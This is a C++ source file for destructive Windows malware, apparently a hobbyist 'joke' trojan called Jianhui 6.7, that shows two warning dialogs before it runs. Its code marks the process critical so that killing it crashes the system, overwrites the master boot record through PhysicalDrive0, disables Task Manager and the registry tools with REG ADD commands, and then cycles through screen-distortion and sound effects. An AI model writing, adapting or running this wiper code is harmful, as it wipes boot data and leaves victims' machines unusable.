// Jianhui 6.7.cpp : Defines the entry point for the application.
//

#pragma warning(disable:4244)
#pragma warning(disable:4552)
#pragma warning(disable:4554)
#pragma warning(disable:4129)
#pragma warning(disable:4305)
#pragma warning(disable:4715)
#include "def.h"
#include "sound.h"
#include "payload.h"
#include "noskid.h"
#include "ilovenoskidder.h" 

typedef VOID(_stdcall* RtlSetProcessIsCritical) (
	IN BOOLEAN        NewValue,
	OUT PBOOLEAN OldValue,
	IN BOOLEAN     IsWinlogon);

BOOL EnablePriv(LPCWSTR lpszPriv) {
	HANDLE hToken;
	LUID luid;
	TOKEN_PRIVILEGES tkprivs;
	ZeroMemory(&tkprivs, sizeof(tkprivs));

	if (!OpenProcessToken(GetCurrentProcess(), (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY), &hToken))
		return FALSE;

	if (!LookupPrivilegeValue(NULL, lpszPriv, &luid)) {
		CloseHandle(hToken); return FALSE;
	}

	tkprivs.PrivilegeCount = 1;
	tkprivs.Privileges[0].Luid = luid;
	tkprivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	BOOL bRet = AdjustTokenPrivileges(hToken, FALSE, &tkprivs, sizeof(tkprivs), NULL, NULL);
	CloseHandle(hToken);
	return bRet;
}

BOOL ProcessIsCritical()
{
	HANDLE hDLL;
	RtlSetProcessIsCritical fSetCritical;

	hDLL = LoadLibraryA("ntdll.dll");
	if (hDLL != NULL)
	{
		EnablePriv(SE_DEBUG_NAME);
		(fSetCritical) = (RtlSetProcessIsCritical)GetProcAddress((HINSTANCE)hDLL, "RtlSetProcessIsCritical");
		if (!fSetCritical) return 0;
		fSetCritical(1, 0, 0);
		return 1;
	}
	else
		return 0;
}

DWORD WINAPI noskid(LPVOID lpParam)
{
	CreateDirectoryA("C:\\jianhui", 0);
	DWORD dwBytesWritten;
	HANDLE hDevice = CreateFileW(
		L"C:\\jianhui\\67.wmv", GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
		CREATE_ALWAYS, 0, 0);

	WriteFile(hDevice, HorseVid, 340159, &dwBytesWritten, 0); // write the file to the handle
	CloseHandle(hDevice);
	ShellExecute(0, 0, L"C:\\jianhui\\67.wmv", 0, 0, SW_SHOW);
	return 0;
}

DWORD WINAPI MBRWiper(LPVOID lpParam) {
	DWORD dwBytesWritten;
	HANDLE hDevice = CreateFileW(
		L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
		OPEN_EXISTING, 0, 0);

	WriteFile(hDevice, MasterBootRecord, 32768, &dwBytesWritten, 0);
	return 1;
}

void mainpayloads() {
	ProcessIsCritical();
	CreateThread(0, 0, MBRWiper, 0, 0, 0);
	Sleep(1000);
	CreateThread(0, 0, noskid, 0, 0, 0);
	Sleep(7000);
	system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableTaskMgr /t reg_dword /d 1 /f");
	system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableRegistryTools /t reg_dword /d 1 /f");

	sound1();
	HANDLE s1 = CreateThread(NULL, 0, fault, NULL, 0, NULL);
	HANDLE bb = CreateThread(NULL, 0, bouncyballs, NULL, 0, NULL);
	Sleep(30000);
	TerminateThread(s1, 0);
	TerminateThread(bb, 0);
	InvalidateRect(0, 0, 0);

	sound2();
	HANDLE s2 = CreateThread(NULL, 0, shader1, NULL, 0, NULL);
	HANDLE nein = CreateThread(NULL, 0, textout, NULL, 0, NULL);
	Sleep(30000);
	TerminateThread(s2, 0);
	InvalidateRect(0, 0, 0);

	sound3();
	HANDLE s3 = CreateThread(NULL, 0, shader2, NULL, 0, NULL);
	Sleep(30000);
	TerminateThread(s3, 0);
	InvalidateRect(0, 0, 0);

	sound4();
	HANDLE s4 = CreateThread(NULL, 0, shader3, NULL, 0, NULL);
	Sleep(30000);
	TerminateThread(s4, 0);
	InvalidateRect(0, 0, 0);

	sound5();
	HANDLE s5 = CreateThread(NULL, 0, shader4, NULL, 0, NULL);
	HANDLE q = CreateThread(NULL, 0, sqjslkdjfsjsdjlksdjsdjk, NULL, 0, NULL);
	Sleep(30000);
	TerminateThread(s5, 0);
	InvalidateRect(0, 0, 0);

	sound6();
	HANDLE s6 = CreateThread(NULL, 0, sierpinski, NULL, 0, NULL);
	Sleep(30000);
	TerminateThread(s6, 0);
	InvalidateRect(0, 0, 0);

	sound7();
	HANDLE s7 = CreateThread(NULL, 0, shader5, NULL, 0, NULL);
	Sleep(30000);
	TerminateThread(s7, 0);
	InvalidateRect(0, 0, 0);

	sound8();
	HANDLE s8 = CreateThread(NULL, 0, shader6, NULL, 0, NULL);
	Sleep(30000);
	TerminateThread(s8, 0);
	InvalidateRect(0, 0, 0);

	sound9();
	HANDLE s9 = CreateThread(NULL, 0, shader7, NULL, 0, NULL);
	Sleep(30000);
	TerminateThread(s9, 0);
	InvalidateRect(0, 0, 0);

	sound10();
	HANDLE s10 = CreateThread(NULL, 0, patblt, NULL, 0, NULL);
	HANDLE s = CreateThread(NULL, 0, dick, NULL, 0, NULL);
	Sleep(30000);
	TerminateThread(s10, 0);
	TerminateThread(s, 0);
	InvalidateRect(0, 0, 0);

	sound11();
	HANDLE s11 = CreateThread(NULL, 0, idk, NULL, 0, NULL);
	Sleep(30000);
	TerminateThread(s11, 0);
	InvalidateRect(0, 0, 0);

	TerminateThread(nein, 0);
	TerminateThread(q, 0);

	ExitProcess(0);

}
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR lpCmdLine, INT nCmdShow) {
	InitDPI();
	if (MessageBoxW(NULL, L"The software you just executed is considered malware. This malware will harm your computer and makes it unusable. If you are seeing this message without knowing what you just executed, simply press No and nothing will happen. If you know what this malware does and are using a safe environment to test, press Yes to start it. Do you want to execute this malware, resulting in an unusable machine?", L"Jianhui 6.7.exe (noskid)", MB_YESNO | MB_ICONERROR | MB_DEFBUTTON2) == IDYES) {
		if (MessageBoxW(NULL, L"This is the last warning! The creator is not responsible for any damage made using this malware! Still execute it?", L"Jianhui 6.7.exe (noskid)", MB_YESNO | MB_ICONERROR | MB_DEFBUTTON2) == IDYES) {
			mainpayloads();
		}
	}
	return 0;
}